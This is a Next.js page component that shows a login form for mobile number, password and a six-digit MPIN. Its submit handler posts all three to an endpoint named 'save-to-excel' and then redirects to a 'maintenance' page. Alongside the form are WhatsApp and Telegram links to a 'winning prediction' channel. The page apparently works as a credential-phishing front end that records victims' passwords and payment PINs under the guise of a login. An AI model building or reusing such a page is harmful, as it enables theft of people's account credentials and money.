"use client";

import NavBarHome from "@/components/NavBar";
import Image from "next/image";
import { useRouter } from "next/navigation";
import { useState } from "react";
import { FaWhatsapp, FaTelegramPlane } from "react-icons/fa";

export default function Home() {
  const router = useRouter();
  const [mobile, setMobile] = useState("");
  const [password, setPassword] = useState("");
  const [mpin, setMpin] = useState("");

  const handleSubmit = async (e) => {
    e.preventDefault();

    const res = await fetch("/api/save-to-excel", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ mobile, password, mpin }),
    });

    const data = await res.json();
    if (data.success) {
      router.push("/maintenance");
    } else {
      alert("Error in Login");
    }
  };

  return (
    <div className="bg-white w-full">
      <NavBarHome />
      <Image
        src="/home-top-image.avif"
        alt="Hello katiya"
        width={1024}
        height={1024}
        className="w-full"
      />
      <div className="flex flex-col items-center my-6">
        <form
          onSubmit={handleSubmit}
          className="flex flex-col items-center my-6 w-full"
        >
          <label className="max-w-[350px] w-full">Mobile Number</label>
          <input
            type="tel"
            value={mobile}
            onChange={(e) => setMobile(e.target.value)}
            placeholder="Enter Your Phone Number"
            className="max-w-[350px] w-full bg-foreground py-3 px-4 rounded-lg text-black outline-none"
            required
          />

          <label className="max-w-[350px] w-full mt-4">Password</label>
          <input
            type="password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            placeholder="Enter Password"
            className="max-w-[350px] w-full bg-foreground py-3 px-4 rounded-lg text-black outline-none"
            required
          />

          <label className="max-w-[350px] w-full mt-4">M Pin</label>
          <input
            type="tel"
            value={mpin}
            onChange={(e) => setMpin(e.target.value)}
            placeholder="Enter your 6 digit mpin"
            className="max-w-[350px] w-full bg-foreground py-3 px-4 rounded-lg text-black outline-none"
            required
          />

          <button
            type="submit"
            className="bg-black py-4 px-10 rounded-full text-white uppercase mt-8 max-w-[350px] w-full"
          >
            Log In
          </button>
        </form>
      </div>
      <div className="flex items-center gap-5 items-center justify-center">
        <a
          href="https://wa.me/6281318026240?text=HELLO%20SIR%20HELP"
          aria-label="WhatsApp"
          target="_blank"
          rel="noopener noreferrer"
          className="bg-black w-12 h-12 rounded-full flex items-center justify-center"
        >
          <FaWhatsapp size={24} className="text-white" />
        </a>
        <a
          href="https://t.me/d11_winning777prediction"
          aria-label="Telegram"
          target="_blank"
          rel="noopener noreferrer"
          className="bg-black w-12 h-12 rounded-full flex items-center justify-center"
        >
          <FaTelegramPlane size={24} className="text-white" />
        </a>
      </div>
      <div className="w-full shadow-sm max-w-[1250px]">
        <Image
          src="/tutorials.webp"
          alt="tutorials"
          width={1024}
          height={1024}
          className="max-w-[1250px] w-full"
        />
      </div>
    </div>
  );
}
